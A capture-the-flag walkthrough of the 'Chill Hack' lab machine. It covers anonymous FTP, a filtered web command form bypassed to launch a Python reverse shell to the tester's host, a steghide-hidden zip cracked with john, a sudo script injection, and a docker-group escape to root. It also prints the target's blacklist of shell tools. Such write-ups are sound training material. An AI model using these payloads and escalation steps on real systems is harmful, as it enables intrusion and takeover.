# Chill Hack

Chill the Hack out of the Machine.

Easy level CTF.  Capture the flags and have fun!

# User Flag

## Initial foothold

An initial scan confirms that 3 services are exposed: 

~~~
PORT      STATE    SERVICE VERSION
21/tcp    open     ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.50.72
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp    open     http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Game Info
~~~

## FTP

Starting with FTP, we connect as `anonymous` and discover a note that discloses 2 usernames (`anurodh` and `apaar`) and tells us we will have to bypass a protection when entering our `command` (we'll see that later).

~~~
kali@kali:/data/Chill_Hack$ ftp 10.10.51.62
Connected to 10.10.51.62.
220 (vsFTPd 3.0.3)
Name (10.10.51.62:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Oct 03  2020 .
drwxr-xr-x    2 0        115          4096 Oct 03  2020 ..
-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
226 Directory send OK.
ftp> get note.txt -
remote: note.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note.txt (90 bytes).
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
226 Transfer complete.
90 bytes received in 0.00 secs (62.4667 kB/s)
~~~

## Web

The enumeration of the web server with gobuster highlights the presence of a `/secret` directory.

~~~
kali@kali:/data/vpn$ gobuster dir -u http://10.10.51.62 -x txt,php,tar,zip -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.51.62
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php,tar,zip
[+] Timeout:        10s
===============================================================
2021/04/26 12:39:53 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.txt (Status: 403)
/.hta.php (Status: 403)
/.hta.tar (Status: 403)
/.hta.zip (Status: 403)
/.htaccess (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.tar (Status: 403)
/.htaccess.zip (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.tar (Status: 403)
/.htpasswd.zip (Status: 403)
/.htpasswd.txt (Status: 403)
/.htpasswd.php (Status: 403)
/contact.php (Status: 200)
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/js (Status: 301)
/secret (Status: 301) <------------------------ interesting!
/server-status (Status: 403)
===============================================================
2021/04/26 12:41:48 Finished
===============================================================
~~~

Browsing this resource shows a form that allows to execute a command (remember the hint from the FTP service).

~~~
kali@kali:/data/vpn$ curl -s http://10.10.51.62/secret/
<html>
<body>

<form method="POST">
        <input id="comm" type="text" name="command" placeholder="Command">
        <button>Execute</button>
</form>
</body>
</html>
~~~

Some commands work (e.g. `id`), meaning that they are not filtered:

~~~
kali@kali:/data/Chill_Hack$ curl -X POST -d "command=id" http://10.10.51.62/secret/
<html>
<body>

<form method="POST">
        <input id="comm" type="text" name="command" placeholder="Command">
        <button>Execute</button>
</form>
<h2 style="color:blue;">uid=33(www-data) gid=33(www-data) groups=33(www-data)
</h2>
			<style>
                             body
                             {
                                   background-image: url('images/blue_boy_typing_nothought.gif');  
				   background-position: center center;
  				   background-repeat: no-repeat;
  				   background-attachment: fixed;
  				   background-size: cover;
}
                          </style>
	</body>
</html>
~~~

## Bypass protection

If we were able to execute `id`, this command won't really help us to go further, and we will obviously need to set up a reverse shell. As we assumed from the previous hint, it is confirmed that there is a filter that prevents from injecting some strings, like `ls`, `cat`, `more`, `less`, ... 

That said, we can find alternatives. For example, `xxd` is permitted to read files instead of `cat`:

~~~
kali@kali:/data/Chill_Hack$ curl -X POST -d "command=xxd%20index.php" http://10.10.51.62/secret/
<html>
<body>

<form method="POST">
        <input id="comm" type="text" name="command" placeholder="Command">
        <button>Execute</button>
</form>
<h2 style="color:blue;">00000000: 3c68 746d 6c3e 0a3c 626f 6479 3e0a 0a3c  <html>.<body>..<
00000010: 666f 726d 206d 6574 686f 643d 2250 4f53  form method="POS
00000020: 5422 3e0a 2020 2020 2020 2020 3c69 6e70  T">.        <inp
00000030: 7574 2069 643d 2263 6f6d 6d22 2074 7970  ut id="comm" typ
00000040: 653d 2274 6578 7422 206e 616d 653d 2263  e="text" name="c
00000050: 6f6d 6d61 6e64 2220 706c 6163 6568 6f6c  ommand" placehol
00000060: 6465 723d 2243 6f6d 6d61 6e64 223e 0a20  der="Command">. 
00000070: 2020 2020 2020 203c 6275 7474 6f6e 3e45         <button>E
00000080: 7865 6375 7465 3c2f 6275 7474 6f6e 3e0a  xecute</button>.
00000090: 3c2f 666f 726d 3e0a 3c3f 7068 700a 2020  </form>.<?php.  
000000a0: 2020 2020 2020 6966 2869 7373 6574 2824        if(isset($
000000b0: 5f50 4f53 545b 2763 6f6d 6d61 6e64 275d  _POST['command']
000000c0: 2929 0a20 2020 2020 2020 207b 0a20 2020  )).        {.   
000000d0: 2020 2020 2020 2020 2020 2020 2024 636d               $cm
000000e0: 6420 3d20 245f 504f 5354 5b27 636f 6d6d  d = $_POST['comm
000000f0: 616e 6427 5d3b 0a20 2020 2020 2020 2020  and'];.         
00000100: 2020 2020 2020 2024 7374 6f72 6520 3d20         $store = 
00000110: 6578 706c 6f64 6528 2220 222c 2463 6d64  explode(" ",$cmd
00000120: 293b 0a20 2020 2020 2020 2020 2020 2020  );.             
00000130: 2020 2024 626c 6163 6b6c 6973 7420 3d20     $blacklist = 
00000140: 6172 7261 7928 276e 6327 2c20 2770 7974  array('nc', 'pyt
00000150: 686f 6e27 2c20 2762 6173 6827 2c27 7068  hon', 'bash','ph
00000160: 7027 2c27 7065 726c 272c 2772 6d27 2c27  p','perl','rm','
00000170: 6361 7427 2c27 6865 6164 272c 2774 6169  cat','head','tai
00000180: 6c27 2c27 7079 7468 6f6e 3327 2c27 6d6f  l','python3','mo
00000190: 7265 272c 276c 6573 7327 2c27 7368 272c  re','less','sh',
000001a0: 276c 7327 293b 0a20 2020 2020 2020 2020  'ls');.         
000001b0: 2020 2020 2020 2066 6f72 2824 693d 303b         for($i=0;
000001c0: 2024 693c 636f 756e 7428 2473 746f 7265   $i<count($store
000001d0: 293b 2024 692b 2b29 0a20 2020 2020 2020  ); $i++).       
000001e0: 2020 2020 2020 2020 207b 0a20 2020 2020           {.     
000001f0: 2020 2020 2020 2020 2020 2020 2020 2020                  
00000200: 2020 2066 6f72 2824 6a3d 303b 2024 6a3c     for($j=0; $j<
00000210: 636f 756e 7428 2462 6c61 636b 6c69 7374  count($blacklist
00000220: 293b 2024 6a2b 2b29 0a20 2020 2020 2020  ); $j++).       
00000230: 2020 2020 2020 2020 2020 2020 2020 2020                  
00000240: 207b 0a20 2020 2020 2020 2020 2020 2020   {.             
00000250: 2020 2020 2020 2020 2020 2020 2020 2020                  
00000260: 2020 2069 6628 2473 746f 7265 5b24 695d     if($store[$i]
00000270: 203d 3d20 2462 6c61 636b 6c69 7374 5b24   == $blacklist[$
00000280: 6a5d 290a 0909 0909 7b3f 3e0a 0909 0909  j]).....{?>.....
00000290: 093c 6831 2073 7479 6c65 3d22 636f 6c6f  .<h1 style="colo
000002a0: 723a 7265 643b 223e 4172 6520 796f 7520  r:red;">Are you 
000002b0: 6120 6861 636b 6572 3f3c 2f68 313e 0a09  a hacker?</h1>..
000002c0: 0909 0909 3c73 7479 6c65 3e0a 0909 0909  ....<style>.....
000002d0: 0909 626f 6479 0a09 0909 0909 097b 0a09  ..body.......{..
000002e0: 0909 0909 0909 6261 636b 6772 6f75 6e64  ......background
000002f0: 2d69 6d61 6765 3a20 7572 6c28 2769 6d61  -image: url('ima
00000300: 6765 732f 4661 696c 696e 674d 6973 6572  ges/FailingMiser
00000310: 6162 6c65 4577 652d 7369 7a65 5f72 6573  ableEwe-size_res
00000320: 7472 6963 7465 642e 6769 6627 293b 0a09  tricted.gif');..
00000330: 0909 0909 0909 6261 636b 6772 6f75 6e64  ......background
00000340: 2d70 6f73 6974 696f 6e3a 2063 656e 7465  -position: cente
00000350: 7220 6365 6e74 6572 3b0a 2020 0909 0909  r center;.  ....
00000360: 0909 0962 6163 6b67 726f 756e 642d 7265  ...background-re
00000370: 7065 6174 3a20 6e6f 2d72 6570 6561 743b  peat: no-repeat;
00000380: 0a20 2009 0909 0909 0909 6261 636b 6772  .  .......backgr
00000390: 6f75 6e64 2d61 7474 6163 686d 656e 743a  ound-attachment:
000003a0: 2066 6978 6564 3b0a 2020 0909 0909 0909   fixed;.  ......
000003b0: 0962 6163 6b67 726f 756e 642d 7369 7a65  .background-size
000003c0: 3a20 636f 7665 723b 0909 0909 090a 097d  : cover;.......}
000003d0: 090a 0909 0909 093c 2f73 7479 6c65 3e0a  .......</style>.
000003e0: 3c3f 7068 7009 0909 0909 2072 6574 7572  <?php..... retur
000003f0: 6e3b 0a09 0909 097d 0a20 2020 2020 2020  n;.....}.       
00000400: 2020 2020 2020 2020 2020 2020 2020 2020                  
00000410: 207d 0a20 2020 2020 2020 2020 2020 2020   }.             
00000420: 2020 207d 0a09 093f 3e3c 6832 2073 7479     }...?><h2 sty
00000430: 6c65 3d22 636f 6c6f 723a 626c 7565 3b22  le="color:blue;"
00000440: 3e3c 3f70 6870 2065 6368 6f20 7368 656c  ><?php echo shel
00000450: 6c5f 6578 6563 2824 636d 6429 3b3f 3e3c  l_exec($cmd);?><
00000460: 2f68 323e 0a09 0909 3c73 7479 6c65 3e0a  /h2>....<style>.
00000470: 2020 2020 2020 2020 2020 2020 2020 2020                  
00000480: 2020 2020 2020 2020 2020 2020 2062 6f64               bod
00000490: 790a 2020 2020 2020 2020 2020 2020 2020  y.              
000004a0: 2020 2020 2020 2020 2020 2020 2020 207b                 {
000004b0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
000004c0: 2020 2020 2020 2020 2020 2020 2020 2020                  
000004d0: 2020 2020 6261 636b 6772 6f75 6e64 2d69      background-i
000004e0: 6d61 6765 3a20 7572 6c28 2769 6d61 6765  mage: url('image
000004f0: 732f 626c 7565 5f62 6f79 5f74 7970 696e  s/blue_boy_typin
00000500: 675f 6e6f 7468 6f75 6768 742e 6769 6627  g_nothought.gif'
00000510: 293b 2020 0a09 0909 0920 2020 6261 636b  );  .....   back
00000520: 6772 6f75 6e64 2d70 6f73 6974 696f 6e3a  ground-position:
00000530: 2063 656e 7465 7220 6365 6e74 6572 3b0a   center center;.
00000540: 2020 0909 0909 2020 2062 6163 6b67 726f    ....   backgro
00000550: 756e 642d 7265 7065 6174 3a20 6e6f 2d72  und-repeat: no-r
00000560: 6570 6561 743b 0a20 2009 0909 0920 2020  epeat;.  ....   
00000570: 6261 636b 6772 6f75 6e64 2d61 7474 6163  background-attac
00000580: 686d 656e 743a 2066 6978 6564 3b0a 2020  hment: fixed;.  
00000590: 0909 0909 2020 2062 6163 6b67 726f 756e  ....   backgroun
000005a0: 642d 7369 7a65 3a20 636f 7665 723b 0a7d  d-size: cover;.}
000005b0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
000005c0: 2020 2020 2020 2020 2020 203c 2f73 7479             </sty
000005d0: 6c65 3e0a 093c 3f70 6870 207d 0a3f 3e0a  le>..<?php }.?>.
000005e0: 3c2f 626f 6479 3e0a 3c2f 6874 6d6c 3e0a  </body>.</html>.
</h2>
			<style>
                             body
                             {
                                   background-image: url('images/blue_boy_typing_nothought.gif');  
				   background-position: center center;
  				   background-repeat: no-repeat;
  				   background-attachment: fixed;
  				   background-size: cover;
}
                          </style>
	</body>
</html>
~~~

Instead of `ls`, we can use `echo *`:

~~~
kali@kali:/data/Chill_Hack$ curl -X POST -d "command=echo%20*" http://10.10.51.62/secret/
<html>
<body>

<form method="POST">
        <input id="comm" type="text" name="command" placeholder="Command">
        <button>Execute</button>
</form>
<h2 style="color:blue;">images index.php
</h2>
			<style>
                             body
                             {
                                   background-image: url('images/blue_boy_typing_nothought.gif');  
				   background-position: center center;
  				   background-repeat: no-repeat;
  				   background-attachment: fixed;
  				   background-size: cover;
}
                          </style>
	</body>
</html>
~~~

## Download reverse shell

After many failed attempts to download a reverse shell (because we don't have write permissions on the web directories), I eventually found that I could execute a python reverse shell by escaping a character of the `python` string, as follows:

~~~
POST /secret/ HTTP/1.1
Host: mafialive.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://mafialive.thm/secret/
Content-Type: application/x-www-form-urlencoded
Content-Length: 233
Connection: close
Upgrade-Insecure-Requests: 1

command=p\ython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.50.72",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
~~~

Here is the reverse shell window:

~~~
kali@kali:/data/Chill_Hack/files$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.50.72] from (UNKNOWN) [10.10.9.76] 53142
www-data@ubuntu:/var/www/html/secret$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

## The files web directory

After failing at searching for the user flag in the `/home` directory, I eventually found an interesting directory in `/var/www/files/`

~~~
www-data@ubuntu:/var/www/files$ ll
ll
total 28
drwxr-xr-x 3 root root 4096 Oct  3  2020 .
drwxr-xr-x 4 root root 4096 Oct  3  2020 ..
-rw-r--r-- 1 root root  391 Oct  3  2020 account.php
-rw-r--r-- 1 root root  453 Oct  3  2020 hacker.php
drwxr-xr-x 2 root root 4096 Oct  3  2020 images
-rw-r--r-- 1 root root 1153 Oct  3  2020 index.php
-rw-r--r-- 1 root root  545 Oct  3  2020 style.css
www-data@ubuntu:/var/www/files$ cat hacker.php
cat hacker.php
<html>
<head>
<body>
<style>
body {
  background-image: url('images/002d7e638fb463fb7a266f5ffc7ac47d.gif');
}
h2
{
  color:red;
  font-weight: bold;
}
h1
{
  color: yellow;
  font-weight: bold;
}
</style>
<center>
  <img src = "images/hacker-with-laptop_23-2147985341.jpg"><br>
  <h1 style="background-color:red;">You have reached this far. </h2>
  <h1 style="background-color:black;">Look in the dark! You will find your answer</h1>
</center>
</head>
</html>
~~~

Download the image (`images/hacker-with-laptop_23-2147985341.jpg`). There is a secret in it.

~~~
kali@kali:/data/Chill_Hack/files$ file hacker-with-laptop_23-2147985341.jpg 
hacker-with-laptop_23-2147985341.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 300x300, segment length 16, baseline, precision 8, 626x417, components 3
kali@kali:/data/Chill_Hack/files$ steghide extract -sf hacker-with-laptop_23-2147985341.jpg 
Enter passphrase: 
wrote extracted data to "backup.zip".
~~~

The resulting `backup.zip` file is a password compressed archive. Let's crack the password.

~~~
kali@kali:/data/Chill_Hack/files$ /data/src/john/run/zip2john backup.zip > backup.hash
ver 2.0 efh 5455 efh 7875 backup.zip/source_code.php PKZIP Encr: 2b chk, TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3 type=8
kali@kali:/data/Chill_Hack/files$ /data/src/john/run/john backup.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pass1word        (backup.zip/source_code.php)
1g 0:00:00:00 DONE (2021-04-26 20:43) 9.090g/s 111709p/s 111709c/s 111709C/s total90..hawkeye
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
~~~

## Lateral move (www-data -> anurodh)

The backup contains a PHP file (`source_code.php`):

```php
<html>
<head>
  Admin Portal
</head>
        <title> Site Under Development ... </title>
        <body>
                <form method="POST">
                        Username: <input type="text" name="name" placeholder="username"><br><br>
      Email: <input type="email" name="email" placeholder="email"><br><br>
      Password: <input type="password" name="password" placeholder="password">
                        <input type="submit" name="submit" value="Submit"> 
    </form>
<?php
        if(isset($_POST['submit']))
  {
    $email = $_POST["email"];
    $password = $_POST["password"];
    if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
    { 
      $random = rand(1000,9999);?><br><br><br>
      <form method="POST">
        Enter the OTP: <input type="number" name="otp">
        <input type="submit" name="submitOtp" value="Submit">
      </form>
    <?php mail($email,"OTP for authentication",$random);
      if(isset($_POST["submitOtp"]))
        {
          $otp = $_POST["otp"];
          if($otp == $random)
          {
            echo "Welcome Anurodh!";
            header("Location: authenticated.php");
          }
          else
          {
            echo "Invalid OTP";
          }
        }
    }
    else
    {
      echo "Invalid Username or Password";
    }
        }
?>
</html>
```

This source code reveals a username and a base64 encoded password:

* Username: `Anurodh`
* Password: `!d0ntKn0wmYp@ssw0rd`

These credentials allow a SSH login as `anurodh`.

## Lateral move (anurodh -> apaar)

We can execute `/home/apaar/.helpline.sh` as `apaar` without password:

~~~
anurodh@ubuntu:~$ sudo -l
Matching Defaults entries for anurodh on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User anurodh may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
~~~

Below is the content of the script:

~~~
anurodh@ubuntu:~$ cat /home/apaar/.helpline.sh
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
~~~

~~~
anurodh@ubuntu:~$ sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: oops
Hello user! I am oops,  Please enter your message: /bin/bash
id
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
python3 -c "import pty;pty.spawn('/bin/bash')"
bash: /home/anurodh/.bashrc: Permission denied
apaar@ubuntu:~$ cd /home/apaar
apaar@ubuntu:/home/apaar$ ls -la
total 44
drwxr-xr-x 5 apaar apaar 4096 Oct  4  2020 .
drwxr-xr-x 5 root  root  4096 Oct  3  2020 ..
-rw------- 1 apaar apaar    0 Oct  4  2020 .bash_history
-rw-r--r-- 1 apaar apaar  220 Oct  3  2020 .bash_logout
-rw-r--r-- 1 apaar apaar 3771 Oct  3  2020 .bashrc
drwx------ 2 apaar apaar 4096 Oct  3  2020 .cache
drwx------ 3 apaar apaar 4096 Oct  3  2020 .gnupg
-rwxrwxr-x 1 apaar apaar  286 Oct  4  2020 .helpline.sh
-rw-rw---- 1 apaar apaar   46 Oct  4  2020 local.txt
-rw-r--r-- 1 apaar apaar  807 Oct  3  2020 .profile
drwxr-xr-x 2 apaar apaar 4096 Oct  3  2020 .ssh
-rw------- 1 apaar apaar  817 Oct  3  2020 .viminfo
apaar@ubuntu:/home/apaar$ cat local.txt
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
~~~

At this stage, it may be a good idea to add your SSH public key (`~/.ssh/id_rsa.pub`) to `/home/apaar/.ssh/authorized_keys` to connect directly using SSH and benefit from a more stable shell.

User flag: `{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}`

# Root Flag

Logging back to `anurodh`, we can see that the user is member of the docker group:

~~~
anurodh@ubuntu:/home/apaar$ id
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
~~~

let's confirm:

~~~
anurodh@ubuntu:/home/apaar$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
alpine              latest              a24bb4013296        11 months ago       5.57MB
hello-world         latest              bf756fb1ae65        16 months ago       13.3kB
~~~

Checking on [GTFOBins](https://gtfobins.github.io/gtfobins/docker/), we confirm there is a possible privilege escalation; let's test:

~~~
anurodh@ubuntu:/home/apaar$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
# cd /root
# ls -la
total 68
drwx------  6 root root  4096 Oct  4  2020 .
drwxr-xr-x 24 root root  4096 Oct  3  2020 ..
-rw-------  1 root root     0 Oct  4  2020 .bash_history
-rw-r--r--  1 root root  3106 Apr  9  2018 .bashrc
drwx------  2 root root  4096 Oct  3  2020 .cache
drwx------  3 root root  4096 Oct  3  2020 .gnupg
-rw-------  1 root root   370 Oct  4  2020 .mysql_history
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
-rw-r--r--  1 root root 12288 Oct  4  2020 .proof.txt.swp
drwx------  2 root root  4096 Oct  3  2020 .ssh
drwxr-xr-x  2 root root  4096 Oct  3  2020 .vim
-rw-------  1 root root 11683 Oct  4  2020 .viminfo
-rw-r--r--  1 root root   166 Oct  3  2020 .wget-hsts
-rw-r--r--  1 root root  1385 Oct  4  2020 proof.txt
# cat proof.txt 


          {ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}


Congratulations! You have successfully completed the challenge.


         ,-.-.     ,----.                                             _,.---._    .-._           ,----.  
,-..-.-./  \==\ ,-.--` , \   _.-.      _.-.             _,..---._   ,-.' , -  `. /==/ \  .-._ ,-.--` , \ 
|, \=/\=|- |==||==|-  _.-` .-,.'|    .-,.'|           /==/,   -  \ /==/_,  ,  - \|==|, \/ /, /==|-  _.-` 
|- |/ |/ , /==/|==|   `.-.|==|, |   |==|, |           |==|   _   _\==|   .=.     |==|-  \|  ||==|   `.-. 
 \, ,     _|==/==/_ ,    /|==|- |   |==|- |           |==|  .=.   |==|_ : ;=:  - |==| ,  | -/==/_ ,    / 
 | -  -  , |==|==|    .-' |==|, |   |==|, |           |==|,|   | -|==| , '='     |==| -   _ |==|    .-'  
  \  ,  - /==/|==|_  ,`-._|==|- `-._|==|- `-._        |==|  '='   /\==\ -    ,_ /|==|  /\ , |==|_  ,`-._ 
  |-  /\ /==/ /==/ ,     //==/ - , ,/==/ - , ,/       |==|-,   _`/  '.='. -   .' /==/, | |- /==/ ,     / 
  `--`  `--`  `--`-----`` `--`-----'`--`-----'        `-.`.____.'     `--`--''   `--`./  `--`--`-----``  


--------------------------------------------Designed By -------------------------------------------------------
          |  Anurodh Acharya |
          ---------------------

                         Let me know if you liked it.

Twitter
  - @acharya_anurodh
Linkedin
  - www.linkedin.com/in/anurodh-acharya-b1937116a



# 
~~~

Root flag: `{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}`
